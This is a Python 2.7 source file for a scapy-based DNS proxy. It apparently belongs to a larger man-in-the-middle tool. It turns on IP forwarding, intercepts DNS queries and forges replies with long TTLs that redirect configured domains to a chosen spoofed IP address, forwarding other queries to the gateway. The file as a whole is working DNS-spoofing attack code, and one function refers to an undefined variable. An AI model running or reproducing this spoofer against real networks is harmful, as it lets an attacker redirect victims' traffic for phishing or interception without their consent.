#!/usr/bin/python2.7 
 
from __future__ import print_function
import sys, time 
from scapy.all import * 
from multiprocessing import Process
import netifaces
import DNSConf

WARNING = '\033[91m'
END = '\033[0m'

class DNSproxy(Process): 
  def __init__(self, params):
    super(DNSproxy, self).__init__()
    self.counter = 0
    self.interface = params.interface
    self.conf = params.conf
    self.myip = netifaces.ifaddresses(self.interface)[2][0]['addr']
    self.mymac = netifaces.ifaddresses(self.interface)[17][0]['addr']
    self.router = params.gateway
    self.enableIpForwarding()
    print ('\033[92m[+]\tStarting DNS proxy\033[0m')


  def forward_dns(self, orig_pkt):
        copyReq = IP(dst=self.router)/UDP(sport=orig_pkt[UDP].sport)/\
            DNS(rd=1,id=orig_pkt[DNS].id, qd=DNSQR(qname=orig_pkt[DNSQR].qname, qtype=orig_pkt[DNSQR].qtype, qclass=orig_pkt[DNSQR].qclass))
        response = sr1(copyReq, verbose=0)
        respPkt = IP(src = self.router, dst=orig_pkt[IP].src)/UDP(dport=orig_pkt[UDP].sport)/DNS()
        respPkt[DNS] = response[DNS]
        send(respPkt, verbose=0)
        print (COL + ' [DNS] ' + respPkt[IP].dst + ' > ' + respPkt[DNS].qd.qname + END)
  
  @staticmethod
  def forge_reply(pkt, qname, spoofed):
        ip = IP()
        udp = UDP()
        ip.src = pkt[IP].dst
        ip.dst = pkt[IP].src
        udp.sport = pkt[UDP].dport
        udp.dport = pkt[UDP].sport
        qd = pkt[UDP].payload
        dns = DNS(id = qd.id, qr = 1, qdcount = 1, ancount = 1, arcount = 1, nscount = 1, rcode = 0)
        dns.qd = qd[DNSQR]
        dns.an = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
        dns.ns = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
        dns.ar = DNSRR(rrname = qname, ttl = 257540, rdlen = 4, rdata = spoofed)
        return(ip/udp/dns)
  
  def call(self, pkt):
            spoofed = self.conf.getIPFromDomain(pkt[DNS].qd.qname)
            dns = pkt[UDP].payload
            qname = dns[DNSQR].qname
            print ('DNS ' + qname + " / ", end="")    
            if spoofed:
                print(WARNING + 'spoofed to ' + spoofed + END, end="")
                send (self.forge_reply(pkt, qname, spoofed), verbose = 0) 
                return {'meth': 2}
            else:
                print('forward', end="")
                return {'meth': 0}
  
  def stop(self): 
    print ('\033[94m[-]\tStopping DNS proxy\033[0m')

  def enableIpForwarding(self):
    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '1\n':
        ipf.write('1\n')
    ipf.close()